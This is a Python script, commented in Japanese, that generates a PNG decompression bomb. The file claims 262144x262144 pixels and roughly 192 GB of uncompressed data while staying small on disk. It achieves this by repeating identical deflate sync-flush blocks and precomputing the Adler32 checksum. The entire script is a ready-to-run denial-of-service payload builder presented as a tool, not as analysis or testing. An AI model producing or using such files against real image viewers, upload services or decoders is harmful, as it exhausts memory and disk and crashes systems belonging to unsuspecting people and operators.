import zlib
import struct
import time
import os

# ==========================================
# ▼▼▼ 設定エリア（ここを書き換える） ▼▼▼
# ==========================================

# 1. 画像のサイズを指定（ピクセル単位）
# ※ 横幅(WIDTH) はメモリに乗る範囲（数百万px程度まで推奨）
# ※ 縦幅(HEIGHT) は理論上無限（1兆pxでも一瞬で生成可能）
IMAGE_WIDTH  = 262144
IMAGE_HEIGHT = 262144

# 2. 出力するファイル名
OUTPUT_FILENAME = "custom_pattern_bomb.png"

# 3. 繰り返すピクセルのパターン（RGBのタプル）
# ここで定義した色が横方向に繰り返され、1行のベース模様になります。
# 何色設定してもOKです。
PATTERN_PIXELS =[
    (255, 0, 0),     # 赤
    (0, 255, 0),     # 緑
    (0, 0, 255),     # 青
    (255, 255, 0),   # 黄
    (0, 255, 255),   # シアン
    (255, 0, 255),   # マゼンタ
    (255, 255, 255), # 白
    (0, 0, 0)        # 黒
]

# ==========================================
# ▲▲▲ 設定エリアここまで ▲▲▲
# ==========================================


# --- 以下、PNGジェネレータのコアエンジン ---

def combine_adler(adler1, len1, adler2, len2):
    """2つのAdler32チェックサムを数学的に結合する"""
    BASE = 65521
    a1, b1 = adler1 & 0xffff, adler1 >> 16
    a2, b2 = adler2 & 0xffff, adler2 >> 16
    a_new = (a1 + a2 - 1) % BASE
    rem = len2 % BASE
    b_new = (b1 + b2 + a1 * rem - rem) % BASE
    return ((b_new << 16) | a_new)

def repeat_adler(adler_base, length, times):
    """同じAdler32チェックサムをN回繰り返した結果を O(log N) で計算する"""
    result_adler = 1
    result_len = 0
    cur_adler = adler_base
    cur_len = length
    while times > 0:
        if times % 2 == 1:
            result_adler = combine_adler(result_adler, result_len, cur_adler, cur_len)
            result_len += cur_len
        cur_adler = combine_adler(cur_adler, cur_len, cur_adler, cur_len)
        cur_len *= 2
        times //= 2
    return result_adler

class IDATWriter:
    """PNGのIDATチャンク（画像データ部）を適切なサイズに分割して出力するラッパー"""
    def __init__(self, f, max_chunk_size=100*1024*1024):
        self.f = f
        self.max_chunk_size = max_chunk_size
        self.buf = bytearray()
        
    def write(self, data):
        self.buf.extend(data)
        while len(self.buf) >= self.max_chunk_size:
            chunk = self.buf[:self.max_chunk_size]
            self._write_chunk(chunk)
            self.buf = self.buf[self.max_chunk_size:]
            
    def flush(self):
        if self.buf:
            self._write_chunk(self.buf)
            self.buf = bytearray()
            
    def _write_chunk(self, chunk):
        self.f.write(struct.pack('!I', len(chunk)))
        self.f.write(b'IDAT')
        self.f.write(chunk)
        self.f.write(struct.pack('!I', zlib.crc32(chunk, zlib.crc32(b'IDAT'))))


def generate_png():
    print(f"--- 究極PNGジェネレータ 起動 ---")
    print(f"サイズ: {IMAGE_WIDTH} x {IMAGE_HEIGHT} px")
    raw_size = (IMAGE_WIDTH * 3 + 1) * IMAGE_HEIGHT
    print(f"非圧縮時の推定容量: {raw_size / (1024**3):.2f} GB")
    print(f"[{time.strftime('%X')}] 1行目のベースパターンを構築中...")

    # 1. パターンをバイト列に変換
    pattern_bytes = bytearray()
    for r, g, b in PATTERN_PIXELS:
        pattern_bytes.extend([r, g, b])
    
    # 2. 幅に合わせてパターンを敷き詰める
    target_bytes = IMAGE_WIDTH * 3
    repeats = target_bytes // len(pattern_bytes)
    remainder = target_bytes % len(pattern_bytes)
    
    row_data = bytearray()
    row_data.extend(pattern_bytes * repeats)
    row_data.extend(pattern_bytes[:remainder])

    # 3. PNGの行データを定義
    row1 = bytearray([0]) + row_data                # 1行目: フィルタ0(None) + 生のカラーデータ
    row2 = bytearray([2]) + bytearray(target_bytes) # 2行目以降: フィルタ2(Up) + 全てゼロ(差分なし)

    print(f"[{time.strftime('%X')}] Adler32チェックサムの時空跳躍計算を実行中...")
    adler_row1 = zlib.adler32(row1)
    if IMAGE_HEIGHT > 1:
        adler_row2 = zlib.adler32(row2)
        total_adler_row2s = repeat_adler(adler_row2, len(row2), IMAGE_HEIGHT - 1)
        final_adler = combine_adler(adler_row1, len(row1), total_adler_row2s, len(row2) * (IMAGE_HEIGHT - 1))
    else:
        final_adler = adler_row1

    print(f"[{time.strftime('%X')}] Z_SYNC_FLUSH による増幅用バイナリの抽出中...")
    c = zlib.compressobj(level=9, wbits=-15)
    
    out1 = c.compress(row1) + c.flush(zlib.Z_SYNC_FLUSH)
    if IMAGE_HEIGHT > 1:
        out2 = c.compress(row2) + c.flush(zlib.Z_SYNC_FLUSH)
        if IMAGE_HEIGHT > 2:
            out3 = c.compress(row2) + c.flush(zlib.Z_SYNC_FLUSH) # ここが無限増幅の要
        out_last = c.compress(row2) + c.flush()
    else:
        # 1行しかない場合の特殊処理
        out1 = c.compress(row1) + c.flush()

    print(f"[{time.strftime('%X')}] ファイル '{OUTPUT_FILENAME}' にストリーミング書き出し中...")
    with open(OUTPUT_FILENAME, 'wb') as f:
        # PNGシグネチャ
        f.write(b'\x89PNG\r\n\x1a\n')
        
        # IHDRチャンク
        ihdr_data = struct.pack('!IIBBBBB', IMAGE_WIDTH, IMAGE_HEIGHT, 8, 2, 0, 0, 0)
        f.write(struct.pack('!I', len(ihdr_data)))
        f.write(b'IHDR')
        f.write(ihdr_data)
        f.write(struct.pack('!I', zlib.crc32(b'IHDR' + ihdr_data)))
        
        # IDATチャンク (画像データ部)
        idat = IDATWriter(f)
        idat.write(b'\x78\xDA') # zlibヘッダ
        
        if IMAGE_HEIGHT == 1:
            idat.write(out1)
        elif IMAGE_HEIGHT == 2:
            idat.write(out1)
            idat.write(out_last)
        else:
            idat.write(out1)
            idat.write(out2)
            
            # 増幅ループ（超高速I/O）
            repeats_out3 = IMAGE_HEIGHT - 3
            multiplier = max(1, min(100000, 10 * 1024 * 1024 // len(out3)))
            big_out3 = out3 * multiplier
            
            for _ in range(repeats_out3 // multiplier):
                idat.write(big_out3)
            for _ in range(repeats_out3 % multiplier):
                idat.write(out3)
                
            idat.write(out_last)
            
        # 計算済みのAdler32をフッタとして付与
        idat.write(struct.pack('!I', final_adler))
        idat.flush()
        
        # IENDチャンク
        f.write(struct.pack('!I', 0))
        f.write(b'IEND')
        f.write(struct.pack('!I', zlib.crc32(b'IEND')))
        
    final_size_mb = os.path.getsize(OUTPUT_FILENAME) / (1024**2)
    print(f"[{time.strftime('%X')}] 完成！ 実際の出力ファイルサイズ: {final_size_mb:.2f} MB")

if __name__ == "__main__":
    generate_png()
